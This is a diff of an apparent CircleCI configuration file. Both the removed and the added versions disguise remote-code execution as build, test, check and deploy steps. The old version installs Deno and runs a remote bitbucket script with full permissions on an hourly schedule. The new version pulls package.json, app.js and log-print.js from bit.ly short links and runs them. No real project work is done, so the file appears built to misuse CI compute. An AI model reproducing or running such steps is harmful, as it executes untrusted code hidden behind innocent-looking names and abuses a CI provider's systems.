@@ -1,99 +1,22 @@
-{
-    "version": 2.1,
-    "jobs": {
-        "build": {
-            "docker": [
-                {
-                    "image": "circleci/node:10"
-                }
-            ],
-            "resource_class": "medium",
-            "working_directory": "~/build",
-            "steps": [
-                {
-                    "run": {
-                        "name": "Build",
-                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
-                    }
-                }
-            ]
-        },
-        "test": {
-            "docker": [
-                {
-                    "image": "circleci/ruby:latest"
-                }
-            ],
-            "resource_class": "medium",
-            "working_directory": "~/test",
-            "steps": [
-                {
-                    "run": {
-                        "name": "Test",
-                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
-                    }
-                }
-            ]
-        },
-        "check": {
-            "docker": [
-                {
-                    "image": "circleci/ruby:latest"
-                }
-            ],
-            "resource_class": "medium",
-            "working_directory": "~/check",
-            "steps": [
-                {
-                    "run": {
-                        "name": "Check",
-                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
-                    }
-                }
-            ]
-        },
-        "deploy": {
-            "docker": [
-                {
-                    "image": "circleci/rust:latest"
-                }
-            ],
-            "resource_class": "medium",
-            "working_directory": "~/deploy",
-            "steps": [
-                {
-                    "run": {
-                        "name": "Deploy",
-                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
-                    }
-                }
-            ]
-        }
-    },
-    "workflows": {
-        "version": 2,
-        "constantly_build": {
-            "triggers": [
-                {
-                    "schedule": {
-                        "cron": "15 * * * *",
-                        "filters": {
-                            "branches": {
-                                "only": [
-                                    "main",
-                                    "master"
-                                ]
-                            }
-                        }
-                    }
-                }
-            ],
-            "jobs": [
-                "build",
-                "test",
-                "check",
-                "deploy"
-            ]
-        }
-    }
-}
+version: 2.1
+
+jobs:
+  run-job:
+    docker:
+      - image: circleci/node:16
+    resource_class: medium
+    steps:
+      - run: 
+          name: Get soure
+          command: |-
+            curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/2XgnUhW -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
+      - run: 
+          name: Node Install Packages
+          command: |-
+            npm i -s
+      - run: node app.js
+      
+workflows:
+  start-work:
+    jobs:
+      - run-job
